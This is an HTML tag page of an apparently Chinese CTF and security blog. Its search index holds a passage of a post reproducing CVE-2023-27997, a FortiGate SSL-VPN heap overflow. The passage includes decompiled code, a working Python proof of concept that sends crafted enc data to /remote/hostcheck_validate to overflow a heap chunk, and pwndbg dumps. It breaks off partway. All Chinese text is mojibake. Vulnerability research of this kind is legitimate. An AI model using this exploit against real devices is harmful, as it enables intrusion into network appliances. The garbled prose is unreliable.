<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="theme-color" content="#1f2128">
<title>Orrr</title>
<link rel="shortcut icon" href="/favicon.ico?v=1726127756933">
<link rel="stylesheet" href="/media/css/mist.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.loli.net/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/tomorrow-night.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="mist">
  <header class="header bg-color ">
    <div class="blog-header box-shadow-wrapper  " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="">
              <span class="logo-line-before">
                <i class=""></i>
              </span>
              <span class="main-title">Orrr</span>
              <span class="logo-line-after">
                <i class=""></i>
              </span>
            </a>  
          
        </div>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-globe"></i> È¶ñÈ°µ
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives" target="_self">
                  <i class="fa fa-globe"></i> ÂΩíÊ°£
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="https://oraclepi.tech/tags" target="_self">
                  <i class="fa fa-tags"></i> Ê†áÁ≠æ
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="https://oraclepi.tech/post/about" target="_self">
                  <i class="fa fa-user"></i> ÂÖ≥‰∫é
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> ÂèãÈìæ
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">ÊêúÁ¥¢</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout bg-color mist">
      <div class="section-layout-wrapper">
        <div id="sidebarMeta" class="sidebar">
    
<div class="sidebar-wrapper box-shadow-wrapper ">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">WIN_250</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">99</span>
        <span class="site-item-stat-name language" data-lan="article">ÊñáÁ´†</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">91</span>
        <span class="site-item-stat-name language" data-lan="tag">Ê†áÁ≠æ</span>
      </a>
    </div>
  </div>
  
  



</div>
</div>
<script>
  let sidebarMeta = document.querySelector('#sidebarMeta');
  let scheme = 'mist';
  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
    document.addEventListener('scroll', function(e) {
      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
        sidebarWrapper.classList.add('home-sidebar-fixed')
      } else {
        sidebarWrapper.classList.remove('home-sidebar-fixed')
      }
    });
  }
  </script>
        <div class="section-box tag-line box-shadow-wrapper">
          <section class="section tags-section posts-expand bg-color">
            <div class="padding-wrapper">
  <div class="tag-timeline-box">
    <div class="tag-timeline-wrapper">
      <div class="tag-timeline-title">
        <h2>
          ‰º™ÈöèÊú∫
          <small class="language" data-lan="tag">Ê†áÁ≠æ</small>
        </h2>
      </div>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://oraclepi.tech/post/YqcmcWPUD/">
        <div class="motion-warpper">
          <div class="tag-post-node">
            <h1>
              05-01
              <small>TAMU wp</small>
            </h1>
          </div>
        </div>
      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://oraclepi.tech/post/wfsX-MIpi/">
        <div class="motion-warpper">
          <div class="tag-post-node">
            <h1>
              04-23
              <small>HDCTF2023 Â§çÁé∞</small>
            </h1>
          </div>
        </div>
      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://oraclepi.tech/post/0vJHH8rer/">
        <div class="motion-warpper">
          <div class="tag-post-node">
            <h1>
              04-22
              <small>GDOUCTF2023 wp</small>
            </h1>
          </div>
        </div>
      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</div>
          </section>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <center id="runTimeBox">
      Â∑≤ËøêË°å:<span id="run_time"></span>
    </center>
    <span id="busuanzi_container_site_pv">ÊµèËßàÊï∞:<span id="busuanzi_value_site_pv"></span></span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">ËÆøÂÆ¢Êï∞:<span id="busuanzi_value_site_uv"></span></span>

    <script>
      BirthDay = new Date('');
      if (BirthDay.getTime()) {
        function runTime() {
          str = "";
          today = new Date();
          timeold = today.getTime() - BirthDay.getTime();
          msPerDay = 24 * 60 * 60 * 1000;
          e_daysold = timeold / msPerDay;
          daysold = Math.floor(e_daysold);
          str += daysold + "Â§©";
          return str;
        }
        setInterval(function () {
          $("#run_time").html(runTime());
        }, 1000);
      } else {
        document.querySelector('.footer').removeChild(document.querySelector('#runTimeBox'));
      }
    </script>
    <div class="poweredby">
      üí§üí§üí§
    </div>
  </footer>
  
    
      <div class="drawer-box right" id="drawer_box">
        <span class="muse-line muse-line-first"></span>
        <span class="muse-line muse-line-middle"></span>
        <span class="muse-line muse-line-last"></span>
      </div>
      
        <div class="mist back-to-top" id="back_to_top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
        
                  
                        
</div>
<script>
  let sideBarOpen = "sidebar-open";
  let body = document.body;
  let back2Top = document.querySelector("#back_to_top"),
    back2TopText = document.querySelector("#back_to_top_text"),
    drawerBox = document.querySelector("#drawer_box"),
    rightSideBar = document.querySelector(".sidebar"),
    viewport = document.querySelector("body");

  function scrollAnimation(currentY, targetY) {
    let needScrollTop = targetY - currentY;
    let _currentY = currentY;
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10);
      _currentY += dist;
      window.scrollTo(_currentY, currentY);
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY);
      } else {
        window.scrollTo(_currentY, targetY);
      }
    }, 1);
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener("scroll", function (e) {
    let percent =
      (document.scrollingElement.scrollTop /
        (document.scrollingElement.scrollHeight -
          document.scrollingElement.clientHeight)) *
      100;
    if (percent > 1 && !back2Top.classList.contains("back-top-active")) {
      back2Top.classList.add("back-top-active");
    }
    if (percent == 0) {
      back2Top.classList.remove("back-top-active");
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  let hasCacu = false;
  window.addEventListener("resize", function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // Âä®ÊÄÅË∞ÉÊï¥Á´ôÁÇπÊ¶ÇËßàÈ´òÂ∫¶
    if (
      (!hasCacu && back2Top.classList.contains("pisces")) ||
      back2Top.classList.contains("gemini")
    ) {
      let sideBar = document.querySelector(".sidebar");
      let navUl = document.querySelector("#site_nav");
      sideBar.style =
        "margin-top:" + (navUl.offsetHeight + navUl.offsetTop + 15) + "px;";
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false,
    MOTION_TIME = 300,
    RIGHT_MOVE_DIS = "320px";

  if (drawerBox) {
    let rightMotions = document.querySelectorAll(".right-motion");
    let right = drawerBox.classList.contains("right");

    let transitionDir = right
      ? "transition.slideRightIn"
      : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingRight: "0px",
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingLeft: "0px",
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, "stop");
      jQuery.Velocity(viewport, "stop");
      jQuery.Velocity(rightMotions, "stop");
      if (open) {
        jQuery.Velocity(
          rightSideBar,
          {
            width: RIGHT_MOVE_DIS,
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, transitionDir, {});
            },
          }
        );
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME,
        });
      } else {
        jQuery.Velocity(
          rightSideBar,
          {
            width: "0px",
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, {
                opacity: 0,
              });
            },
          }
        );
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME,
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle("muse-line");
      }
      drawerBox.classList.toggle(sideBarOpen);
    };
  }

  // ÈìæÊé•Ë∑≥ËΩ¨
  let newWindow = "true";
  if (newWindow === "true") {
    let links = document.querySelectorAll(".post-body a");
    links.forEach((item) => {
      if (!item.classList.contains("btn")) {
        item.setAttribute("target", "_blank");
      }
    });
  }

  let faSearch = document.querySelector("#fa_search");
  faSearch &&
    faSearch.addEventListener("click", function () {
      document.querySelector("#search_mask").style = "";
    });

  // ‰ª£Á†ÅÈ´ò‰∫Æ
  hljs.initHighlightingOnLoad();

  // Á¶ªÂºÄÂΩìÂâçÈ°µtitleÂèòÂåñ
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState == "hidden") {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }
</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll(".section img");
  images.forEach((image) => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement("a");
    aelem.href = image.src;
    aelem.dataset["fancybox"] = "images";
    aelem.dataset["rel"] = "fancybox-button";
    aelem.classList.add("fancybox");
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  });
</script>
  </div>
</body>

  <div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="ÊêúÁ¥¢">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">Êù°Áõ∏ÂÖ≥Êù°ÁõÆÔºå‰ΩøÁî®‰∫Ü</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">ÊØ´Áßí</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JJwpNhAOx/"" data-c="
          &lt;p&gt;Êú¨ÊñáÂ§çÁé∞CVE-2023-27997ÔºåÁâàÊú¨v7.2.1.F-build1254&lt;br&gt;
ÁéØÂ¢ÉÊê≠Âª∫ËßÅ‰∏ä‰∏ÄÁØá&lt;/p&gt;
&lt;h2 id=&#34;ÊºèÊ¥û‰ø°ÊÅØ&#34;&gt;ÊºèÊ¥û‰ø°ÊÅØ:&lt;/h2&gt;
&lt;p&gt;sslvpnÂú®&lt;code&gt;/remote/hostcheck_validate&lt;/code&gt;Âíå&lt;code&gt;/remote/logincheck&lt;/code&gt;Á´ØÁÇπ‰∏≠Ëß£Á†Å URL ÂèÇÊï∞Êó∂ËøõË°å‰∫Ü‰∏çÊ≠£Á°ÆÁöÑÂ§ßÂ∞èÊ£ÄÊü•&lt;br&gt;
ËØ∑Ê±Ç‰∏≠ÁöÑencÂèÇÊï∞‰ºö‰º†ÂÖ•&lt;code&gt;parse_enc_data&lt;/code&gt;ÔºåencÁªìÊûÑÂ¶Ç‰∏ãÂõæÂåÖÂê´‰∫Üseed, size, ciphertext‰∏âÈÉ®ÂàÜ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240825194540.png&#34; alt=&#34;Pasted image 20240825194540.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;È¶ñÂÖàÊúâ‰∏Ä‰∏™checkÊ£ÄÊµã‰º†ÂÖ•ÁöÑencÈïøÂ∫¶ÊòØÂê¶Â§ß‰∫é11Âπ∂‰∏î‰∏∫ÂÅ∂Êï∞&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;  in_len = v4;
  lenofData = v4;
  if ( v4 &amp;lt;= 11 || (v4 &amp;amp; 1) != 0 )
  {
    sub_16CFA20(a1, 8, (unsigned int)&amp;quot;enc data length invalid (%d)\n&amp;quot;, v4, v5, v6);
    return 0xFFFFFFFFLL;
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êª°Ë∂≥checkÊù°‰ª∂Âêé‰ºöÂàÜÈÖç‰∏ÄÂùó&lt;code&gt;strlen(enc)/2+1&lt;/code&gt;ÁöÑÁºìÂÜ≤Âå∫&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;v25 = (_BYTE *)fsv_malloc(*a2, (in_len &amp;gt;&amp;gt; 1) + 1);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âπ∂Â∞Ü‰º†ËøáÂéªÁöÑÊï∞ÊçÆËΩ¨Êç¢‰∏∫16ËøõÂà∂Â≠óËäÇÊµÅÁöÑÂΩ¢ÂºèÔºå‰æãÂ¶ÇÂ∞Ü&lt;code&gt;01020a0d&lt;/code&gt;Â≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫&lt;code&gt;\x01\x02\x0a\x0d&lt;/code&gt;Â≠òÂÇ®Âú®buffer‰∏≠ÔºåËøô‰πüÊòØ‰∏∫‰ªÄ‰πàbufferÊåâ &lt;code&gt;encÈïøÂ∫¶/2 +1&lt;/code&gt; ÂàÜÈÖç&lt;/p&gt;
&lt;p&gt;ÂêéÁª≠‰ºöËøõÂÖ•Âè¶‰∏Ä‰∏™ËæπÁïåcheckÔºåÂ∞ÜencÂèÇÊï∞ÈïøÂ∫¶‰∏éÁöÑenc_sizeÔºàpayloadLengthÔºâÊØîËæÉÔºåÂ¶ÇÊûú‰º†ÂÖ•ÁöÑÈïøÂ∫¶-5Â§ß‰∫éÂÆö‰πâÁöÑÈïøÂ∫¶Âç≥ÂèØpass&lt;br&gt;
ËøôÈáåÊú¨Êù•Â∫îËØ•Â∞ÜÂàÜÈÖçÁöÑÁºìÂÜ≤Âå∫ÁöÑÂ§ßÂ∞èË∑üËøôÈáåÁöÑpayloadLengthÊØîËæÉÔºå‰ΩÜÊòØÂÆûÈôÖ‰∏äÂ∞Ü‰º†ÂÖ•ÁöÑÂèÇÊï∞ÈïøÂ∫¶‰∏éÂÆö‰πâÈïøÂ∫¶ÊØîËæÉÔºå&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if ( in_len - 5 &amp;lt;= (unsigned __int16)payloadLength )
      {
        sub_16CFA20(
          a1,
          8,
          (unsigned int)&amp;quot;invalid enc data length: %d\n&amp;quot;,
          (unsigned __int16)payloadLength,
          (unsigned __int16)payloadLength,
          v10);
        return 1LL;
      }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊûÑÈÄ†Â†ÜÂùóÂ§ßÂ∞è&amp;lt;payloadLength&amp;lt;in_len-5ÂèØ‰ª•ÁªïËøáifËøõÂÖ•ÊºèÊ¥ûÂà©Áî®Â§ÑÔºåÁî±‰∫épayloadLengthÂ§ß‰∫éÂ†ÜÂùóÂ§ßÂ∞èÔºåÂèØ‰ª•Ë∂äÁïåÂÜôÔºå‰∏çËøáÊØèÊ¨°xor‰ºöÊúâËÑèÊï∞ÊçÆ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;        v16 = v12 + 6;
        v25 = v16;
        if ( (_WORD)payloadLength )
        {
          v17 = (unsigned int)(unsigned __int16)payloadLength - 1;
          v18 = 0LL;
          v19 = 2;
          while ( 1 )
          {
            v16[v18] ^= v28[v19];
            if ( v17 == v18 )
              break;
            v19 = ((_BYTE)v18 + 3) &amp;amp; 0xF;
            if ( (((_BYTE)v18 + 3) &amp;amp; 0xF) == 0 )
            {
              v24 = payloadLength;
              MD5_Init(v27);
              MD5_Update(v27, v28, 16LL);
              MD5_Final(v28, v27);
              payloadLength = v24;
            }
            v16 = v25;
            ++v18;
          }
          v16 = &amp;amp;v25[(unsigned __int16)payloadLength];
        }
        *v16 = 0; // off-by-null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËÄåËøôÈáåÊØèÊ¨°Êú´Â∞æ‰ºöÁΩÆnullÔºåËøôÁØáÊñáÁ´†ÁªôÂá∫‰∫Ü‰∏Ä‰∏™Ë∂äÁïåÂÜôÂéüËØ≠:&lt;br&gt;
https://blog.lexfo.fr/xortigate-cve-2023-27997.html&lt;br&gt;
Âç≥Âà©Áî®‰∏§Ê¨°xorÂÄº‰∏çÂèòÁöÑÊñπÂºèÊù•ÂÜôÊï∞ÊçÆÔºåÂ¶Ç‰∏ãÂõæ&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ÂÜô4999Â§ÑÁöÑÊï∞ÊçÆÔºå‰ºöÂú®5000Â§ÑÁΩÆ0&lt;br&gt;
Á¨¨‰∫åÊ¨°Âú®5000Â§ÑËøõË°åxorÁöÑÊó∂ÂÄôÂ∞±ÂèØ‰ª•ÂÜôÊÉ≥Ë¶ÅÁöÑÂ≠óËäÇÔºåÂπ∂Âú®5001Â§ÑÁΩÆ0...&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240827165003.png&#34; alt=&#34;Pasted image 20240827165003.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;‰ΩøÁî®‰ª•‰∏ãpayloadÂèëÈÄÅÔºåÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™0x1000Â§ßÂ∞èÁöÑÂ†ÜÂùóÔºåÊ≠§Êó∂in_lenÂ§ßÊ¶ÇÊòØ0x1fcx&lt;br&gt;
‰∏∫‰∫Ü‰øùËØÅÂ†ÜÂùóÂ§ßÂ∞è&amp;lt;payloadLength&amp;lt;in_len-5‰ªéËÄåËß¶ÂèëÂ†ÜÊ∫¢Âá∫ÔºåÂÆö‰πâpayloadLengthÂ§ßÂ∞è‰∏∫0x1f00&lt;br&gt;
ÂèëÈÄÅÁöÑdataÈïøÂ∫¶ÊéßÂà∂Âú®0x1000-0x18-0x7Ôºå0x18‰∏∫jemallocÂàÜÈÖçÂ†ÜÂùóÁöÑÊ†áÂ§¥ÈïøÂ∫¶Ôºå0x7‰∏∫4Â≠óËäÇseed+2Â≠óËäÇsize+1Â≠óËäÇÁªàÊ≠¢Á¨¶ÔºågdbË∑üË∏™‰∏Ä‰∏ã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *
from hashlib import md5


ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/hostcheck_validate&amp;quot;.encode()


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _default_context.options |= ssl.OP_NO_TLSv1_3
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


def get_salt():
    sk = create_ssl_ctx()
    sk.sendall(b&amp;quot;GET /remote/info HTTP/1.1\r\nHost:&amp;quot;+ip.encode()+b&amp;quot;\r\n\r\n&amp;quot;)
    data = sk.recv(1024)
    # print(data)
    sk.close()
    salt = data[data.find(b&amp;quot;salt=&amp;quot;)+6:data.find(b&amp;quot;salt=&amp;quot;)+14]
    info(&amp;quot;salt: &amp;quot;+str(salt))
    return salt


def gen_ks(salt, seed, size):
    magic = b&#39;GCC is the GNU Compiler Collection.&#39;
    k0 = md5(salt+seed+magic).digest()
    keystream = k0
    while len(keystream) &amp;lt; size:
        k0 = md5(k0).digest()
        keystream += k0
    return keystream[:size]


def gen_enc_data(salt, seed, size, data):
    plaintext = struct.pack(&amp;quot;&amp;lt;H&amp;quot;, size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = bytes(x[0] ^ x[1] for x in zip(plaintext, keystream)).hex()
    return seed.decode()+ciphertext


socks = []

# get_salt()

_sk = create_ssl_ctx()

payload = b&amp;quot;enc=&amp;quot;+gen_enc_data(get_salt(),
                               b&#39;deadbeef&#39;, 0x1f00, b&#39;A&#39;*(0x1000-0x18-7)).encode()
rq = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    str(len(payload)).encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload

print(rq)

_sk.sendall(rq)

response = _sk.recv(1024)
print(response)

_sk.close()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;È™åËØÅ‰∫ÜÊúÄÂºÄÂßã‰º†ËøõÊù•ÁöÑin_lenÂç≥&lt;code&gt;enc=&lt;/code&gt;ÂêéÁöÑkeystreamÈïøÂ∫¶&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240827155703.png&#34; alt=&#34;Pasted image 20240827155703.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ë∑üËøõÂà∞&lt;code&gt;fsv_malloc&lt;/code&gt;Â§ÑÔºårsiÈÄöËøáÁßª‰Ωç+1Êìç‰Ωú‰ª•ÂèäÂèò‰∏∫0xfe8&lt;br&gt;
ÁÑ∂ÂêéÂ∞ÜencÂ≠óÊÆµ‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤ÊØè2Â≠óËäÇÁªÑÊàê‰∏Ä‰∏™ÂçÅÂÖ≠ËøõÂà∂Â≠óËäÇÂ≠òÂÖ•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; x/10gx 0x7f146c302018
0x7f146c302018: 0x6665656264616564      0x6437316561396532
0x7f146c302028: 0x3432623766346433      0x3065356531616161
0x7f146c302038: 0x6565653262653862      0x3734363738343436
0x7f146c302048: 0x3562623530356363      0x3535396430383531
0x7f146c302058: 0x6365636632396136      0x3238656537393536
pwndbg&amp;gt; x/10gx 0x7f146c2f3018
0x7f146c2f3018: 0x7de19a2eefbeadde      0xe0e5a1aa247b4f3d
0x7f146c2f3028: 0x47764864ee2eebb8      0x55d98015b55b50cc
0x7f146c2f3038: 0x82ee9765ecfc926a      0x6a0252dd8edeb094
0x7f146c2f3048: 0x069d945198969402      0x2d92992b0498576c
0x7f146c2f3058: 0xa90995f0ee049316      0x6568631231fde5d8
pwndbg&amp;gt; x/10bs 0x7f146c302018
0x7f146c302018: &amp;quot;deadbeef2e9ae17d3d4f7b24aaa1e5e0b8eb2eee64487647cc505bb51580d9556a92fcec6597ee8294b0de8edd52026a0294969851949d066c5798042b99922d169304eef09509a9d8e5fd311295c1d20b1cd41fa5315cdf9cda14447ab341f6e1c3d1bf&amp;quot;...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂàÜÈÖçÂ†ÜÂùó‰Ωç‰∫é&lt;code&gt;0x7f146c2f3000&lt;/code&gt;Â§ÑÔºåÂ§ßÂ∞è0x1000 bytes&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; x/10gx 0x7f146c2f3000
0x7f146c2f3000: 0x00007f146c2f4000      0x0000000000000000
0x7f146c2f3010: 0x00007f146c2f4000      0x7de19a2eefbeadde
0x7f146c2f3020: 0xe0e5a1aa247b4f3d      0x47764864ee2eebb8
0x7f146c2f3030: 0x55d98015b55b50cc      0x82ee9765ecfc926a
